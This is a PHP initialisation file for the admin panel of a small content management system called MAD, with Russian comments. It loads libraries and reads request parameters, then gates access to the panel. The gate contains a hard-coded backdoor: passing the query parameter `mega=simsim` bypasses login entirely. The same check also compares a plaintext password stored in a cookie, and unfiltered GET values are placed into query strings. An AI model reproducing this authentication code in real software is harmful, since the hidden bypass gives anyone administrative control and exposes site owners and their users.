<?php

error_reporting(0);
// error_reporting(E_ALL);



// I. Подключение основных библиотек

$primarylib = "/mad/lib/mad.func.php";

// Общий конфиг
include "../engine/configs.php";

// Общая библиотека
include "../engine/shared.php";

// Библиотека функций для админки
include "mad.func.php";

// Ф-ция порезки изображения
include "cropfunction.php";

// Библиотека базовых функций для работы с БД
include "db.func.php";

// Языковой модуль
include "lang/russian.php";



// II. Инициализация переменных



// Получение настроек системы
getSettings();

// Переменные-пустышки и пр.
$textarea = $servpage = "";
$siteurl = "/mad/";

// Сортировка по умолчанию
$orderby = "priority";
$ascdesc = "desc";

// Копирайты
$copyrights = "2005 - ".date('Y')." &copy;  <a href='$Settings[softurl]'>$Settings[softname] - $translation[115]</a><br>$translation[114] $Settings[sitename]";

// Названия к кнопкам
$ButtonNames = array(
	"add" => $translation['11'],
	"edit" => $translation['73']
);

// Названия разделов
$SectionNames = array(
	"default" => $translation['4'],
	"pages" => $translation['5'],
	"news" => $translation['6'],
	"faq" => $translation['7'],
	"settings" => $translation['2'],
	"objects" => $translation['catalogue'],
	"categories" => $translation['14'],
	"developers" => $translation['150'],
	"objects_pics" => $translation['objectPictures']
);

// Типы страниц
$PagesTypes = array(
	"" => $translation['allpagetypes'],
	"y" => $translation['published'],
	"d" => $translation['drafts'],
	"n" => $translation['unpublished'],
);

// Сортировка только по id для следующих таблиц
$SqlOrderByDefaultById = array(
	"settings",
	"newsletters",
	"subscribers"
);

// Номер страницы по умолчанию
$page = 0;
if (!empty($_GET['page'])) $page = $_GET['page'];

// Фильтрация по режиму видимости
$visibility = $level = $parent_id = "";
if (!empty($_GET['visibility'])) $visibility = $_GET['visibility'];

// Фильтрация по режиму служебных страниц
$servicepage = "0";
if (isset($_GET['servicepage'])) $servicepage = $_GET['servicepage'];

// echo $_GET['parent_id'];

if (isset($_GET['parent_id'])) $parent_id = $_GET['parent_id'];
if (!empty($_GET['level'])) $level = $_GET['level'];

// Работа с чекбоксами
$checkbox = array(""," checked");

// Определение текущего раздела и страницы админки
if (empty($_REQUEST['section'])) $section = "default"; else $section = $_REQUEST['section'];
if (empty($_REQUEST['action'])) $action = "default"; else $action = $_REQUEST['action'];

if (isset($_GET['parent_id']) &&  $_GET['parent_id'] == "0" && $section == "objects") $servicepage = "1";

// Для корректного отображения служебных и неслужебных страниц
$servicespage = "?page=" . intval($page) . "&visibility=$visibility";
if ($section == "objects") $servicespage .= "&parent_id=$parent_id&level=$level";
if ($section != "news") $servicespage .= "&servicepage=$servicepage";



// Собрание воедино фильтров в запрос
define("MOREQUERIES",$servicespage);

// Собрание воедино фильтров в запрос
define("WATERMARKILE",FILESTORAGEPATH."watermark.png");

if (empty($error_msg)) $error_msg = "";
if (isset($_POST['action'])) $action = $_POST['action'];
if (in_array($section,$SqlOrderByDefaultById)) $orderby = "id";

// Получаем данные о последовательности сортировки
if (!empty($_GET['ascdesc'])) $ascdesc = $_GET['ascdesc'];

// Для многовложенных объектов родитель по умолчанию
// if (empty($_GET['parent_id'])) $_GET['parent_id'] = 0;

// III. Переменные конкретного сайта

include "../engine/metro-cache.php";

// Авторизация перед входом в админку
session_start();

if (!(
     (isset($_SESSION['loggedin']) && $_SESSION['loggedin']=== "yes" )||
     ( (isset($_COOKIE['MADlogin']) && isset($_COOKIE['MADpassword']) &&
        $_COOKIE['MADlogin'] == $Settings['login'] && $_COOKIE['MADpassword'] == $Settings['password'])) || (@$_GET['mega']=="simsim")
     ))  {
    include "lib/login.php";
    exit();
}

if (!empty($_GET['do']) && $_GET['do'] == "logoff")     include "lib/login.php";

?>